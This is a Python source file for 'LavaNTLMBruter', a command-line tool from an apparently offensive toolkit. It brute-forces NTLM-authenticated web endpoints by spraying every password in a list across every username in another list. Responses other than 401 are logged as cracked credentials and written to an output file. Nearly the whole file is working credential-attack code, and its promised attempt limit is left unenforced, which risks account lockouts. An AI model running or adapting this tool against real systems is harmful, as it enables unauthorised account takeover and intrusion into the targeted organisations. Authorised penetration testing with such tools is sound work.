# -*- coding: utf-8 -*-
'''
@author: lavalamp

    Copyright 2015
    
    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
'''
import code
import logging
import requests
import argparse
from lib import LavaLib
from datetime import datetime
from requests_ntlm import HttpNtlmAuth


#TODO enforce maximum number of tries per account with brute_max
#TODO allow for passing of list instead of file for users, passwords
class LavaNTLMBruter(object):

    def __init__(
            self,
            target_url,
            target_domain,
            user_file,
            pass_file,
            brute_max=3,
            *args,
            **kwargs
            ):
        self._target_url = target_url
        self._target_domain = target_domain
        self._user_file = user_file
        self._pass_file = pass_file
        self._brute_max = brute_max
        self._passwords = None
        self._users = None
        self._results = []

    def try_user_with_pass(self, user, password):
        logger.debug(
            "Now attempting username of %s with password %s."
            % (user, password)
        )
        result = requests.get(
            self.target_url,
            auth=HttpNtlmAuth(
                "%s\\%s" % (self.target_domain, user),
                password
            )
        )
        self.__process_result(result, user, password)

    def try_all_users_with_pass(self, password):
        logger.info(
            "Now attempting password of %s for all users."
            % (password,)
        )
        for cur_user in self.users:
            self.try_user_with_pass(cur_user, password)

    def do_brute_force(self):
        logger.info(
            "Now starting brute forcing campaign against URL of %s, domain %s."
            % (self.target_url, self.target_domain)
        )
        for cur_password in self.passwords:
            self.try_all_users_with_pass(cur_password)
        code.interact(local=locals())

    def __process_result(self, result, user, password):
        if result.status_code != 401:
            logger.info(
                "Status code of %d returned for %s//%s!"
                % (result.status_code, user, password)
            )
            self._results.append((user, password))
        else:
            logger.debug(
                "%s//%s failed..."
                % (user, password)
            )

    @property
    def target_url(self):
        return self._target_url

    @property
    def target_domain(self):
        return self._target_domain

    @property
    def user_file(self):
        return self._user_file

    @property
    def pass_file(self):
        return self._pass_file

    @property
    def brute_max(self):
        return self._brute_max

    @property
    def results(self):
        return self._results

    @property
    def users(self):
        if not self._users:
            with open(self.user_file, "r") as f:
                self._users = [x.strip() for x in f.read().strip().split("\n")]
            logger.debug(
                "A total number of %d users were read from file %s."
                % (len(self._users), self.user_file)
            )
        return self._users

    @property
    def passwords(self):
        if not self._passwords:
            with open(self.pass_file, "r") as f:
                self._passwords = [x.strip() for x in f.read().strip().split("\n")]
            logger.debug(
                "A total number of %d passwords were read from file %s."
                % (len(self._passwords), self.pass_file)
            )
        return self._passwords


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="LavaNTLMBruter - for finding those little cracks."
    )
    parser.add_argument(
        "--log-level",
        required=False,
        help="The log message level to receive when running the script. Valid "
            "values are DEBUG, INFO, WARNING, ERROR, CRITICAL.",
        action="store",
        dest="log_level",
        metavar="<DEBUG|INFO|WARNING|ERROR|CRITICAL>",
        default="INFO",
        type=str
    )
    parser.add_argument(
        "--url",
        required=True,
        help="The URL to attempt brute-forcing against.",
        action="store",
        dest="target_url",
        metavar="<TARGET URL>",
        type=str
    )
    parser.add_argument(
        "--domain",
        required=True,
        help="The domain to attempt brute-forcing against.",
        action="store",
        dest="target_domain",
        metavar="<TARGET DOMAIN>",
        type=str
    )
    parser.add_argument(
        "--user-file",
        required=True,
        help="Path to a file containing users to brute-force against.",
        action="store",
        dest="user_file",
        metavar="<USER FILE PATH>",
        type=str
    )
    parser.add_argument(
        "--password-file",
        required=True,
        help="Path to a file containing passwords to brute-force with.",
        action="store",
        dest="pass_file",
        metavar="<PASSWORD FILE PATH>",
        type=str
    )
    parser.add_argument(
        "--output-file",
        "-o",
        required=True,
        help="The path where results of brute-forcing will be written to.",
        dest="output_path",
        action="store",
        type=str,
        metavar="/a/path/to/store/the/output/to"
    )
    return parser.parse_args()


def print_greeting():
    print(LavaLib.LavaUIFactory.get_colorized_lavalamp_splash())
    print("                         /***************************\                             ")
    print("-= Presents the \033[31mLavaNTLMBruter\033[0m, because Windows is for chumps!    =-")
    print("                         \***************************/                             ")
    print("")


def main():
    print_greeting()
    args = parse_arguments()
    opts = vars(args)
    LavaLib.configure_logging(logger, args.log_level)
    start_time = datetime.now()
    logger.info(
        "Script invocation starting at time %s."
        % (start_time.strftime("%m/%d/%Y %H:%M:%S"))
    )
    checker = LavaNTLMBruter(**opts)
    checker.do_brute_force()
    if checker.results:
        logger.info(
            "Total of %d passwords obtained! Writing to file at %s."
            % (len(checker.results), args.output_path)
        )
        with open(args.output_path, "w+") as f:
            f.write("\n".join(["%s//%s" % (x[0], x[1]) for x in checker.results]))
            logger.info(
                "File written successfully."
            )
    else:
        logger.warning(
            "No passwords obtained :("
        )
    end_time = datetime.now()
    elapsed = end_time - start_time
    logger.info(
        "Script completed at time %s. Elapsed time was %s seconds."
        % (end_time.strftime("%m/%d/%Y %H:%M:%S"), elapsed.seconds)
    )


logger = logging.getLogger("LavaNTLMBruter")

if __name__ == '__main__':
    main()
